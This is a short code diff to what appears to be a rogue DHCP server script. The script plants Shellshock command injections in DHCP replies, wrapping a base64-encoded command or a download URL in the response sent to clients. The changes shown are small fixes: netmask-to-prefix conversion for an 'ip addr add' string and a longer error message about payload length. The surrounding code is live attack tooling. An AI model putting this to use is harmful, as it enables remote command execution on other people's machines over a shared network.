@@ -7,6 +7,7 @@ from scapy.all import BOOTP, DHCP, sniff
 from socket import socket, AF_PACKET, SOCK_RAW, inet_aton
 from base64 import b64encode
 from struct import pack
+from netaddr import IPAddress
 
 Base.check_user()
 Base.check_platform()
@@ -257,7 +258,7 @@ def dhcp_reply(request):
 
             else:
                 net_settings = "/bin/ip addr add " + requested_ip + \
-                               "/" + network_mask + " dev eth0;"
+                               "/" + str(IPAddress(network_mask).netmask_bits()) + " dev eth0;"
 
                 if args.shellshock_command is not None:
                     b64command = b64encode(net_settings + args.shellshock_command)
@@ -279,7 +280,7 @@ def dhcp_reply(request):
                     shellshock_url += " 2>/dev/null"
 
                 if len(shellshock_url) > 255:
-                    print "[ERROR] Len of command is very big!"
+                    print "[ERROR] Len of command is very big! Current len: " + str(len(shellshock_url))
                     shellshock_url = "A"
 
                 global proxy
